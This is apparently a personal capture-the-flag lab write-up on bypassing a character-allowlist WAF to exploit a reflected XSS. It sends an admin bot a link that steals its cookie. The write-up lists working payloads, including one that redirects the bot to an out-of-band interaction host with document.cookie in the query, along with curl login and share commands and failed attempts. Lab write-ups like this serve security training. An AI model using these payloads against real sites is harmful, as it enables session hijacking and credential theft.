# Velvet Pwnbox Lab - WAF Charset XSS Admin Bot

**Date:** 2026-07-09  
**Target:** https://3363610e0a78.pwnbox-lab.com/  
**Status:** In progress — admin bot confirmed, flag not captured yet

## Lab description

Members' area. "Doorman" WAF allows only "ordinary characters." Sign in with demo account, bypass filter, share a link to admin who reviews it.

**Demo creds:** `demouser` / `qwerty@123`

## App surface (confirmed)

| Endpoint | Role |
|----------|------|
| `GET /login` | Login form, CSRF in page |
| `POST /login` | JSON `{csrf_token, username, password}` → session cookie |
| `GET /profile` | Auth required; XSS sink + share UI |
| `POST /share` | JSON `{url}` — admin bot visits same-origin URL |
| `GET /logout` | Clears session |

No other useful routes found (`/api`, `/flag`, `/admin`, etc. all 404).

## XSS sink (confirmed)

`GET /profile?message=PAYLOAD` (authenticated) reflects into:

```javascript
// A humble gift for you =D
var message = "PAYLOAD";
```

Only reflection point. `message` variable is **unused** in page JS — exploit requires **string breakout**, not relying on `message` being read later.

Unauthenticated `/profile?message=...` → 302 `/login` (query param lost). Admin bot must visit **with admin session**.

## WAF allowlist (confirmed)

**Allowed:** `./0123456789;=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz` plus `"`, `'`, space

**Blocked (400 `WAF: disallowed characters in message`):** `() + ? : , [] {} - _ @ # $ % & * \` !` and unicode hyphen lookalikes

Notes:
- `"` closes the JS string early → breakout works
- `/` alone is OK; `https://` blocked (colon)
- Hyphens blocked anywhere in payload → **webhook.site UUID paths unusable**
- `+` blocked even inside single-quoted strings in payload
- Base64 alphabet fits allowlist (hint: "ordinary characters" ≈ base64 charset)

## Working payloads (WAF-passing)

### Proof of external navigation (admin bot confirmed)

```
";location="//OAST_DOMAIN/";//
```

Admin bot hit interactsh (DNS + HTTP) on `*.oast.fun`, `*.oast.pro`, `*.oast.live`.

### Cookie exfil without `+` (best candidate — not fully verified for flag)

```
";location.hostname="OAST_DOMAIN";location.search=document.cookie;//
```

Sets cross-origin URL to `https://OAST_DOMAIN/?<cookie>` without using `+`, `?`, or `()` in payload.

Example OAST (ephemeral): `d97dlos9udq47sgh1ptg7i6ftui896to7.oast.live`

### Same-origin cookie navigation (works syntactically, flag path unknown)

```
";location=document.cookie;//
```

### Alert PoC (WAF-passing, not useful for exfil)

```
";onerror=alert;throw 1;//
```

## Failed / dead ends

| Approach | Why it failed |
|----------|----------------|
| Pure base64 in `message` (no breakout) | No server/client auto-decode; inert |
| `";eval(atob(message));//` | `()` blocked by WAF |
| `";onerror=eval;throw '...';//` | eval receives `"Uncaught ..."` prefix → SyntaxError |
| `";onerror=location.assign;throw document.cookie;//` | `Illegal invocation` (assign unbound) |
| `";onerror=eval;throw 'location=...';//` | Same eval/onerror prefix issue |
| `webhook.site/{uuid}` in payload | Hyphens in UUID blocked |
| `+` for string concat / query building | Blocked everywhere in message param |
| `share_url` / `shareLink()` | Underscore / parens blocked; can't auto-trigger share |
| Flag in share/profile response after wait | Not observed (~90s polling) |
| Flask session forge | Common secrets wordlist failed |

## Share flow

```bash
# Login
curl -sS -c /tmp/velvet-cj -X POST "https://3363610e0a78.pwnbox-lab.com/login" \
  -H "Content-Type: application/json" \
  -d '{"csrf_token":"<from /login HTML>","username":"demouser","password":"qwerty@123"}'

# Share XSS URL
curl -sS -b /tmp/velvet-cj -X POST "https://3363610e0a78.pwnbox-lab.com/share" \
  -H "Content-Type: application/json" \
  -d '{"url":"https://3363610e0a78.pwnbox-lab.com/profile?message=PAYLOAD_URLENCODED"}'
```

Same-origin check on share: host must be lab domain (weak: `%00.evil.com` accepted in testing but irrelevant).

## Exfil tooling

- **interactsh-client v1.2.4** at `/tmp/interactsh/interactsh-client` — bot hits confirmed, but client throws `Could not unmarshal interaction data` (version mismatch?) — **flag not readable yet**
- **webhook.site** tokens created but UUID path blocked by hyphen rule
- **localtunnel** / **requestcatcher** — timeouts or hyphens in hostname

## Next steps (tomorrow)

1. **Upgrade interactsh-client** (v1.4.5+ download failed mid-session) or use webhook alternative with **no hyphens** in entire payload (oast domains OK).
2. Re-run winning payload:
   ```
   ";location.hostname="NEW_OAST_DOMAIN";location.search=document.cookie;//
   ```
3. Read HTTP interaction query string for `FLAG=pwnbox{...}`.
4. If hostname/search race fails on HTTPS origin, test variants:
   - `";location="//OAST/";location.search=document.cookie;//` (order/race)
   - `";window.name=document.cookie;location.hostname="OAST";location.search=window.name;//` (if name persists — likely blocked by needing concat)
5. Verify in real browser on lab origin (file:// tests misleading for hostname assignment).
6. Optional: base64 inner payload if we find **paren-free** decode+exec gadget (none found yet).

## Key URLs / artifacts

- Lab: https://3363610e0a78.pwnbox-lab.com/
- Interactsh binary: `/tmp/interactsh/interactsh-client`
- Session cookie jar: `/tmp/velvet-cj`

**Flag:** not captured yet.
